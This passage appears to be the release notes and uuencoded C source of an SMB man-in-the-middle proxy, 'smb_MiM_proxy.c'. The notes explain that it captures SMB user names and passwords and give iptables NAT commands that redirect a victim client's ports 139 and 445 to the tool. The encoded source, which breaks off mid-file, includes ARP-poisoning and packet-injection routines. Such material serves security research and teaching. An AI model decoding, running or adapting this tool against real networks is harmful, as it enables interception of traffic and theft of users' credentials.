The attacker&#039;s machine should have no active connections with the server 
or with the client (like FTP or telnet ...).
The default listening port is 1139

This program gives the password and the user name (if necessary). It 
also gives the security level (share or user). If the connection has 
succeeded, it gives the name of the share and a message like &quot;password 
valid&quot;. If it has failed, it gives nothing (just the password and the
user name).

This program should be compiled on Linux for some technical reasons,
like the network byte ordering. You shouldn&#039;t use it on the loopback
interface.

Support Windows 2k/XP specifications.

This is the iptables/NAT command to execute on the attacker&#039;s machine

To redirect incoming traffic to port 139 on port 1139

#iptables -t nat -A PREROUTING -i eth0 -p tcp -s 192.168.1.3 \
--dport 139 -j REDIRECT --to-port 1139

192.168.1.3 is the IP address of the client. 


To redirect the whole traffic

#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

To redirect incoming traffic to port 445 on port 1139

(for Windows 2k/XP client with NBT disabled)

#iptables -t nat -A PREROUTING -i eth0 -p tcp -s 192.168.1.3 \
--dport 445 -j REDIRECT --to-port 1139

192.168.1.3 is the IP address of the client. 


if you want to perform the downgrade attack of the chapter 6.8 remplace
the port 1139 by a closed port.

Be careful, for the traffic redirection, this line must be present in the
/etc/sysconfig/network :

FORWARD_IPV4=true

This program doesn&#039;t support UNICODE strings.

Successfully tested with samba server 2.0 .

begin 600 smb_MiM_proxy.c
M+RHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*@T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(%--0B!-04X@24X@5$A%($U)1$1,12!!5%1!0TL-&quot;B`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!#;V1E9&quot;!B&gt;2!L961I;@T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;!L961I;D!E;F-E&lt;&amp;AA;&amp;]N+7IE&lt;F\N8V]M#0H@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@1F]R(&amp;5D=6-A=&amp;EO;F%L(&#039;!U&lt;G!O&lt;V4@;VYL&gt;2`A
M#0HJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHO#0H-&quot;B-I;F-L=61E(#QS=&amp;1I
M;RYH/@T*(VEN8VQU9&amp;4@/&#039;-T&lt;FEN9RYH/@T*(VEN8VQU9&amp;4@/&#039;-T9&amp;QI8BYH
M/@T*(VEN8VQU9&amp;4@/&#039;5N:7-T9&quot;YH/@T*(VEN8VQU9&amp;4@/&amp;5R&lt;FYO+F@^#0HC
M:6YC;&#039;5D92`\&lt;VEG;F%L+F@^#0HC:6YC;&#039;5D92`\&lt;WES+VEO8W1L+F@^#0HC
M:6YC;&#039;5D92`\&lt;WES+W1I;64N:#X-&quot;B-I;F-L=61E(#QS&gt;7,O=V%I=&quot;YH/@T*
M(VEN8VQU9&amp;4@/&#039;-Y&lt;R]S=&amp;%T+F@^#0H-&quot;B-I;F-L=61E(#QN970O:68N:#X-
M&quot;B-I;F-L=61E(#QS&gt;7,O&lt;V]C:V5T+F@^#0HC:6YC;&#039;5D92`\87)P82]I;F5T
M+F@^#0H-&quot;B-I;F-L=61E(#QN971I;F5T+VEP+F@^#0HC:6YC;&#039;5D92`\;F5T
M:6YE=&quot;]I;BYH/@T*(VEN8VQU9&amp;4@/&amp;YE=&amp;EN970O=&amp;-P+F@^#0HC:6YC;&#039;5D
M92`\;F5T:6YE=&quot;]U9&#039;`N:#X-&quot;B-I;F-L=61E(#QN971I;F5T+VEF7V5T:&amp;5R
M+F@^#0H-&quot;B-I;F-L=61E(#QL:6)N970N:#X-&quot;B-I;F-L=61E(#QP8V%P+F@^
M#0H-&quot;@T*#0HC9&amp;5F:6YE(%--0E]03U)4&quot;3$S.0T*#0HC9&amp;5F:6YE&quot;5--0E]0
M3U)47UA07S)+&quot;30T-0T*#0HC9&amp;5F:6YE&quot;75?:6YT.%]T&quot;75N&lt;VEG;F5D(&amp;-H
M87(-&quot;@T*(V1E9FEN90EU7VEN=#$V7W0)=6YS:6=N960@&lt;VAO&lt;G0-&quot;@T*(V1E
M9FEN90EU7VEN=#,R7W0)=6YS:6=N960@:6YT(`T*#0HC9&amp;5F:6YE&quot;75C:&amp;%R
M&quot;75N&lt;VEG;F5D(&amp;-H87(@#0H-&quot;B-D969I;F4)=5]C:&amp;%R&quot;75N&lt;VEG;F5D(&amp;-H
M87(-&quot;@T*(V1E9FEN90E)4%]-05A?4TE:10DV-34S-0T*#0HC9&amp;5F:6YE&quot;45.
M0U]+15E?3$5.1U1(&quot;3@-&quot;@T*(V1E9FEN90E%3D-?4$%34U=/4D1?3$5.1U1(
M&quot;3(T#0H-&quot;B`-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BH-&quot;B`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!35%)50U154D53(&quot;`@(&quot;`@(&quot;`@(`T*
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ+R`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@#0IT&gt;7!E9&amp;5F(&#039;-T&lt;G5C=`T*&gt;PT*(&#039;5?:6YT.%]T(%1Y&lt;&amp;4[&quot;0DO
M*G1Y&lt;&amp;4J+PD-&quot;B!U7VEN=#A?=&quot;!&amp;;&amp;%G&lt;SL)+RIF;&amp;%G&lt;RHO#0H@=5]I;G0Q
M-E]T($QE;F=T:#L)+RIL96YG=&amp;@@;V8@=&amp;AE($Y&quot;5&quot;!S97-S:6]N(&#039;!A8VME
M=&quot;HO#0I]($YB=%-E&lt;W-I;VY(9&#039;([#0H-&quot;@T*=&#039;EP961E9B!S=&#039;)U8W0-&quot;GL-
M&quot;B!U7VEN=#A?=&quot;!0&lt;F]T;V-O;%LT73L)+RI#;VYT86EN&lt;R`P&gt;$9&amp;+&quot;=334(G
M*B\-&quot;B!U7VEN=#A?=&quot;!#;VUM86YD.PDO*D-O;6UA;F0@0V]D92HO#0H@=6YI
M;VX@#0H@&gt;PT*(&quot;!S=&#039;)U8W0-&quot;B`@&gt;PT*(&quot;`@=5]I;G0X7W0@17)R;W)#;&amp;%S
M&lt;SL)+RI%&lt;G)O&lt;B!#;&amp;%S&lt;RHO#0H@(&quot;!U7VEN=#A?=&quot;!297-E&lt;G9E9#L)+RI2
M97-E&lt;G9E9&quot;!F;W(@9G5T=7)E(&#039;5S92HO(`T*(&quot;`@=5]I;G0X7W0@17)R;W);
M,ET[&quot;2\J17)R;W(@0V]D92HO#0H@(&#039;T@1&amp;]S17)R;W([#0H@(&#039;5?:6YT.%]T
M(%-T871U&lt;ULT73L)+RHS,BUB:71S(&amp;5R&lt;F]R(&amp;-O9&amp;4J+PT*(&#039;T@4W1A=&#039;5S
M(#L-&quot;B!U7VEN=#A?=&quot;!&amp;;&amp;%G&lt;SL)+RI&amp;;&amp;%G&lt;RHO#0H@=5]I;G0X7W0@1FQA
M9W,R6S)=.PDO*DUO&lt;F4@1FQA9W,J+PT*(&#039;5N:6]N#0H@&gt;PT*(&quot;!U7VEN=#A?
M=&quot;!0861;,3)=.PT*(&quot;!S=&#039;)U8W0-&quot;B`@&gt;PT*(&quot;`@=5]I;G0X7W0@4&amp;ED2&amp;EG
M:%LR73L)+RI(:6=H(%!A&lt;G0@;V8@=&amp;AE(%!I9&quot;HO#0H@(&quot;!U7VEN=#A?=&quot;!5
M;G5S961;-%T[&quot;2\J3F]T(%5S960J+PT*(&quot;`@=5]I;G0X7W0@56YU&lt;V5D,ELT
M73L)+RI.;W0@57-E9&quot;HO#0H@(&#039;T@17AT&lt;F$[#0H@?2!0861%&gt;&#039;1R83L-&quot;B!U
M7VEN=#A?=&quot;!4:61;,ET[&quot;2\J5&#039;)E92!)9&amp;5N=&amp;EF:65R*B\-&quot;B!U7VEN=#A?
M=&quot;!0:61;,ET[&quot;2\J0V%L;&amp;5R)W,@&lt;&#039;)O8V5S&lt;R!)1&quot;HO#0H@=5]I;G0X7W0@
M56ED6S)=.PDO*E5N875T:&amp;5N=&amp;EC871E9&quot;!U&lt;V5R($E$*B\-&quot;B!U7VEN=#A?
M=&quot;!-:61;,ET[&quot;2\J375L=&amp;EP;&amp;5X($ED*B\-&quot;GT@4VUB0F%S94AD&lt;B`[#0H-
M&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T(`T*&gt;PT*(&#039;5?:6YT.%]T(%=O&lt;F1#;W5N=#L)&quot;2\J
M0V]U;G0@;V8@&lt;&amp;%R86UE=&amp;5R(&#039;=O&lt;F1S(#TQ-RHO#0H@=5]I;G0X7W0@1&amp;EA
M;&amp;5C=$EN9&amp;5X6S)=.PDO*DEN9&amp;5X(&amp;]F(&#039;-E;&amp;5C=&amp;5D(&amp;1I86QE8W0J+PT*
M(&#039;5?:6YT.%]T(%-E8W5R:71Y36]D93L)&quot;2\J4V5C=7)I=&#039;D@36]D92`Z*B\-
M&quot;@D)&quot;0DO*F)I=&quot;`P(#H@,#US:&amp;%R92P@,3UU&lt;V5R*B\-&quot;@D)&quot;0DO*F)I=&quot;`Q
M(#H@,3UE;F-R&gt;7!T(&#039;!A&lt;W-W;W)D&lt;RHO#0H@=5]I;G0X7W0@36%X37!X0V]U
M;G1;,ET[&quot;2\J36%X(%!E;F1I;F&lt;@;75L=&amp;EP;&amp;5X960@&lt;F5Q=65S=&quot;HO#0H@
M=5]I;G0X7W0@36%X3G5M8F5R&lt;U9C&lt;ULR73L)+RI-87@@5D-S(&amp;)E=&#039;=E965N
M(&amp;-L:65N=&quot;!A;F0@&lt;V5R=F5R*B\-&quot;B!U7VEN=#A?=&quot;!-87A&quot;=69F97)3:7IE
M6S1=.PDO*DUA&gt;&quot;!T&lt;F%N&lt;VUI=&quot;!B=69F97(@&lt;VEZ92HO#0H@=5]I;G0X7W0@
M36%X4F%W4VEZ95LT73L)+RI-87@@&lt;F%W(&amp;)U9F9E&lt;B!S:7IE*B\-&quot;B!U7VEN
M=#A?=&quot;!397-S:6]N2V5Y6S1=.PDO*E5N:7%U92!T;VME;B!I9&amp;5N=&amp;EF&gt;6EN
M9R!T:&amp;ES(&#039;-E&lt;W-I;VXJ+PT*(&#039;5?:6YT.%]T($-A&lt;&amp;%B:6QI=&amp;EE&lt;ULT73L)
M+RI397)V97(@0V%P86)I;&amp;ET:65S*B\-&quot;B!U7VEN=#A?=&quot;!3&gt;7-T96U4:6UE
M3&amp;]W6S1=.PDO*E-Y&lt;W1E;2`H551#*2!T:6UE(&amp;]F(&#039;1H92!S97)V97(@*B\-
M&quot;B!U7VEN=#A?=&quot;!3&gt;7-T96U4:6UE2&amp;EG:%LT73L)+RI3&gt;7-T96T@*%540RD@
M=&amp;EM92!O9B!T:&amp;4@&lt;V5R=F5R(&quot;HO#0H@=5]I;G0X7W0@4V5R=F5R5&amp;EM95IO
M;F5;,ET[&quot;2\J5&amp;EM92!Z;VYE(&amp;]F(&#039;-E&lt;G9E&lt;B`H;6EN(&amp;9R;VT@551#*2HO
M#0H@=5]I;G0X7W0@16YC&lt;GEP=&amp;EO;DME&gt;4QE;F=T:#L)+RI,96YG=&amp;@@;V8@
M96YC&lt;GEP=&amp;EO;B!+97DJ+PT*(&#039;5?:6YT.%]T($)Y=&amp;5#;W5N=%LR73L)&quot;2\J
M0V]U;G0@;V8@9&amp;%T82!B&gt;71E&lt;RHO#0I](%-M8DYE9U!R;W1297!L&gt;4AD&lt;CL@
M#0H-&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T#0I[#0H@=5]I;G0X7W0@5V]R9$-O=6YT.PDO
M*D-O=6YT(&amp;]F(&#039;!A&lt;F%M971E&lt;B!W;W)D&lt;STQ,R`H&lt;F5Q=65S=&quot;DJ+PT*(&#039;5?
M:6YT.%]T($%N9%A#;VUM86YD.PDO*G-E8V]N9&amp;%R&gt;2`H6&quot;D@8V]M;6%N9&quot;PP
M&gt;$9&amp;(#T@;F]N92HO#0H@=5]I;G0X7W0@06YD6%)E&lt;V5R=F5D.PDO*G)E&lt;V5R
M=F5D(&quot;AM=7-T(&amp;)E(&#039;IE&lt;F\I*B\-&quot;B!U7VEN=#A?=&quot;!!;F183V9F&lt;V5T6S)=
M.PDO*F]F9G-E=&quot;!T;R!N97AT(&amp;-O;6UA;F0@5V]R9&amp;-O=6YT*B\-&quot;B!U7VEN
M=#A?=&quot;!-87A&quot;=69F97)3:7IE6S)=.PDO*D-L:65N=&quot;=S(&amp;UA&gt;&amp;EM=6X@8G5F
M9F5R(&#039;-I&gt;F4J+PT*(&#039;5?:6YT.%]T($UA&gt;$UP&gt;$-O=6YT6S)=.PDO*F%C=&#039;5A
M;&quot;!M87AI;75N(&amp;UU;&#039;1I&lt;&amp;QE&gt;&amp;5D(&#039;)E&lt;75E&lt;W0J+PT*(&#039;5?:6YT.%]T(%9C
M3G5M8F5R6S)=.PDO*C`]9FER&lt;W0@*&amp;]N;&#039;DI+&quot;!N;VYZ97)O+6%D9&amp;ET:6]N
M86P@5D,@;G5M8F5R*B\-&quot;B!U7VEN=#A?=&quot;!397-S:6]N2V5Y6S1=.PDO*G-E
M&lt;W-I;VX@:V5Y(&quot;HO#0H@=5]I;G0X7W0@0V%S94EN&lt;V5N&lt;VET:79E4&amp;%S&lt;W=O
M&lt;F1,96YG=&amp;A;,ET[(&quot;\J&lt;VEZ92!O9B!P87-S=V]R9&quot;`H04Y322DJ+PT*(&#039;5?
M:6YT.%]T($-A&lt;V5396YS:71I=F5087-S=V]R9$QE;F=T:%LR73L@+RIS:7IE
M(&amp;]F(&#039;!A&lt;W-W;W)D(&quot;A53DE#3T1%*2HO#0H@=5]I;G0X7W0@4F5S97)V961;
M-%T[&quot;0DO*G)E&lt;V5R=F5D(&quot;AM=7-T(&amp;)E(#`I*B\-&quot;B!U7VEN=#A?=&quot;!#87!A
M8FEL:71I97-;-%T[&quot;2\J8VQI96YT(&amp;-A&lt;&amp;%B:6QI=&amp;EE&lt;RHO#0H@=5]I;G0X
M7W0@0GET94-O=6YT6S)=.PD)+RI#;W5N=&quot;!O9B!D871A(&amp;)Y=&amp;5S.VUI;CTP
M*B\-&quot;GT@4VUB4V5T=7!84F5Q=65S=$AD&lt;B`[#0H-&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T
M#0I[#0H@=5]I;G0X7W0@5V]R9$-O=6YT.PDO*G9A;&#039;5E/30@*B\-&quot;B!U7VEN
M=#A?=&quot;!!;F180V]M;6%N9#L)+RIS96-O;F1A&lt;GD@*%@I(&amp;-O;6UA;F0L,&#039;A&amp;
M1B`](&amp;YO;F4J+PT*(&#039;5?:6YT.%]T($%N9%A297-E&lt;G9E9#L)+RIR97-E&lt;G9E
M9&quot;`H;75S=&quot;!B92!Z97)O*2HO#0H@=5]I;G0X7W0@06YD6$]F9G-E=%LR73L)
M+RIO9F9S970@*B\-&quot;B!U7VEN=#A?=&quot;!&amp;;&amp;%G&lt;ULR73L)+RI!9&amp;1I=&amp;EO;F%L
M(&amp;EN9F]R;6%T:6]N(&quot;HO#0H@=5]I;G0X7W0@4&amp;%S&lt;W=O&lt;F1,96YG=&amp;A;,ET[
M&quot;2\J3&amp;5N9W1H(&amp;]F(&#039;!A&lt;W-W;W)D*B\-&quot;B!U7VEN=#A?=&quot;!&quot;&gt;71E0V]U;G1;
M,ET[&quot;2\J0V]U;G0@;V8@9&amp;%T82!B&gt;71E&lt;R`[(&amp;UI;CTS*B\-&quot;GT@4VUB5&amp;-O
M;EA297%U97-T2&amp;1R(#L-&quot;@T*+RHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*@T*
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!&amp;54Y#5$E/3E,@#0HJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHO#0H-&quot;G9O:60@07)P4F5Q=65S&lt;DEN
M:F5C=&amp;EO;BAU7VEN=#,R7W0@*BP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!U7VEN=#,R7W0@*BP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!U7V-H
M87(@*BP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!U7V-H87(@*BP-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C:&amp;%R(&quot;HL#0H)&quot;0D@&lt;&amp;-A&lt;%]T(&quot;HI
M.PT*#0H-&quot;G9O:60@07)P4&amp;]I&lt;V]N*&#039;5?:6YT,S)?=&quot;`J+`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@=5]I;G0S,E]T(&quot;HL#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!U7V-H87(@*BP-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;5?8VAA&lt;B`J+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@8VAA
M&lt;B`J*3L-&quot;@T*=F]I9&quot;!&#039;971%;F5T061D&lt;F5S&lt;R@-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@=5]C:&amp;%R(&quot;HL#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;-H87(@*BD[
M#0H-&quot;@T*=F]I9&quot;!.96=0&lt;F]T4F5P;&#039;DH#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!U
M7V-H87(@*BP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;5?8VAA&lt;B`J+`T*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@:6YT(&quot;HI.PT*#0IV;VED(%-E=&#039;5P6%)E&lt;75E&lt;W0H#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;5?8VAA&lt;B`J+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;!U7V-H87(@*BP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@:6YT*3L@#0H-
M&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BH-&quot;B`@(&quot;`@(&quot;`@($5.0U)94%1)
M3TX@1E5.0U1)3TY3(&quot;AS:&amp;%M969U;&amp;QY(&#039;1A:V5N(&amp;9R;VT@&lt;V%M8F$@(2D-
M&quot;BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;G9O:60@4TU&quot;96YC&lt;GEP=&quot;AU
M7V-H87(@*BP@=5]C:&amp;%R(&quot;HL(&#039;5?8VAA&lt;B`J*3L-&quot;@T*=F]I9&quot;!334)/5T9E
M;F-R&gt;7!T*&#039;5?8VAA&lt;B`J+&quot;!U7V-H87(@*BP@=5]C:&amp;%R(&quot;HI.PT*#0IV;VED
M($5?4#$V*&amp;-O;G-T(&#039;5N&lt;VEG;F5D(&amp;-H87(@*BP@=6YS:6=N960@8VAA&lt;B`J
M*3L-&quot;@T*=F]I9&quot;!%7U`R-&quot;AC;VYS=&quot;!U;G-I9VYE9&quot;!C:&amp;%R(&quot;HL(`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;!C;VYS=&quot;!U;G-I9VYE9&quot;!C:&amp;%R(&quot;HL#0H@(&quot;`@(&quot;`@(&quot;`@(&#039;5N
M&lt;VEG;F5D(&amp;-H87(@*BD[#0H-&quot;G-T871I8R!V;VED(&#039;!E&lt;FUU=&amp;4H8VAA&lt;B`J
M+&amp;-H87(@*BQU7V-H87(@*BQI;G0I.PT*#0IS=&amp;%T:6,@=F]I9&quot;!L&lt;VAI9G0H
M8VAA&lt;B`J+&amp;EN=&quot;QI;G0I.PT*#0IS=&amp;%T:6,@=F]I9&quot;!C;VYC870H8VAA&lt;B`J
M+&amp;-H87(@*BQC:&amp;%R(&quot;HL:6YT+&amp;EN=&quot;D[#0H-&quot;G-T871I8R!V;VED(&#039;AO&lt;BAC
M:&amp;%R(&quot;HL8VAA&lt;B`J+&amp;-H87(@*BQI;G0I.PT*#0IS=&amp;%T:6,@=F]I9&quot;!D;VAA
M&lt;V@H8VAA&lt;B`J+&amp;-H87(@*BQC:&amp;%R(&quot;HL:6YT*3L-&quot;@T*&lt;W1A=&amp;EC(&#039;9O:60@
M&lt;W1R7W1O7VME&gt;2AC;VYS=&quot;!U;G-I9VYE9&quot;!C:&amp;%R(&quot;HL=6YS:6=N960@8VAA
M&lt;B`J*3L-&quot;@T*&lt;W1A=&amp;EC(&#039;9O:60@&lt;VUB:&amp;%S:&quot;AU;G-I9VYE9&quot;!C:&amp;%R(&quot;HL
M8V]N&lt;W0@=6YS:6=N960@8VAA&lt;B`J+&amp;-O;G-T(`T*&quot;0EU;G-I9VYE9&quot;!C:&amp;%R
M(&quot;HL:6YT(&quot;D[#0H-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BH-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!42$4@0T]$10T**BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ+PT*#0HO*E1O(&#039;-E;F0@82!!4E`@&lt;F5P;&#039;DJ+PT*#0IV;VED
M($%R&lt;%!O:7-O;BAU7VEN=#,R7W0@*D-L:65N=&quot;P@(&quot;`@+RI#;&amp;EE;G0G&lt;R!)
M4&quot;!A9&#039;)E&lt;W,J+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!U7VEN=#,R7W0@*E-M8E-E&lt;G9E
M&lt;BP@+RI334(@4V5R=F5R)W,@25`@861R97-S*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M=5]C:&amp;%R(&quot;I%;F5T0VQI96YT+&quot;`@(&quot;\J0VQI96YT)W,@34%#($%D&lt;F5S&lt;RHO
M#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;5?8VAA&lt;B`J16YE=%-M8E-E&lt;G9E&lt;BPO*G-E&lt;G9E
M&lt;B=S($U!0R!!9&#039;)E&lt;W,J+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C:&amp;%R(&quot;I$979I8V4I
M(&quot;\J1&amp;5V:6-E(&amp;YA;64@9F]R(&amp;EN:F5C=&amp;EO;BHO#0I[#0H@;&amp;EB;F5T7W0@
M*FP[#0H@;&amp;EB;F5T7W!T86=?=&quot;!486&lt;[#0H@8VAA&lt;B!%&lt;G)&quot;=69;3$E&quot;3D54
M7T524D)51E]325I%73L-&quot;@T*#0HO*E=E(&amp;EN:F5C=&quot;!T:&amp;4@&lt;&amp;%C:V5T(&amp;1I
M&lt;F5C=&amp;QY(&amp;]N(&#039;1H92!N971W;W)K*B\-&quot;@T*(&amp;P@/2!L:6)N971?:6YI=&quot;A,
M24).151?3$E.2RQ$979I8V4L17)R0G5F*3L-&quot;@T*+RI792!B=6EL9&quot;!T:&amp;4@
M05)0(&amp;AE861E&lt;BHO#0H-&quot;B!486&lt;@/2!L:6)N971?8G5I;&amp;1?87)P*`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@05)02%)$7T542$52+&quot;\J2&amp;%R9&#039;=A&lt;F4@
M861D&lt;BHO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!%5$A%4E194$5?25`L
M+RI0&lt;F]T;V-O;&quot;!A9&amp;1R*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(#8L
M+RI3:7IE(&amp;]F($U!0R!A9&#039;)E&lt;W,J+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@-&quot;PO*E-I&gt;F4@;V8@25`@861R97-S*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@($%24$]07U)%4$Q9+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M16YE=$-L:65N=&quot;PO*F-L:65N=&quot;=S($U!0R!A9&#039;)E&lt;W,J+PT*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@*&#039;5?8VAA&lt;B`J*2!#;&amp;EE;G0L+RIC;&amp;EE;G0G&lt;R!)
M4&quot;!A9&#039;)E&lt;W,J+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@16YE=%-M8E-E
M&lt;G9E&lt;BPO*E-E&lt;G9E&lt;B!-04,@861D&lt;F5S&lt;RHO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`H=5]C:&amp;%R(&quot;HI(&quot;!3;6)397)V97(L(&quot;`O*E-E&lt;G9E&lt;B!)4&quot;!A
M9&amp;1R97-S*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@($Y53$PL#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`P+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@;&quot;P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(#`I.PT*#0HO*D9O;&amp;QO
M=VEN9R!B&gt;2!T:&amp;4@8G5I;&amp;1I;F&lt;@;V8@=&amp;AE(&amp;5T:&amp;5R;F5T(&amp;AE861E&lt;BHO
M#0H-&quot;B!486&lt;@/2!L:6)N971?875T;V)U:6QD7V5T:&amp;5R;F5T*`T*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@+RI%=&amp;AE&lt;FYE=&quot;!D97-T:6YA
M=&amp;EO;BHO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!%;F5T
M4VUB4V5R=F5R+&quot;`@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!%5$A%4E194$5?05)0+&quot;`@+RI0&lt;F]T;V-O;&quot;!4&gt;7!E*B\-&quot;@D)&quot;0D@;&quot;D[
M#0H-&quot;@T*+RI7&lt;FET92!T:&amp;4@4&amp;%C:V5T(&#039;=I&lt;F4J+PT*#0H@;&amp;EB;F5T7W=R
M:71E*&amp;PI.PT*#0HO*DQI8FYE=&quot;!D97-T&lt;F]Y(&amp;PJ+PT*#0H@;&amp;EB;F5T7V1E
M&lt;W1R;WDH;&quot;D[#0I]#0H-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*
M+RI4;R!H879E(&#039;-E&lt;G9E&lt;B!A;F0@8VQI96YT($U!0R!A9&amp;1R97-S97,J+PT*
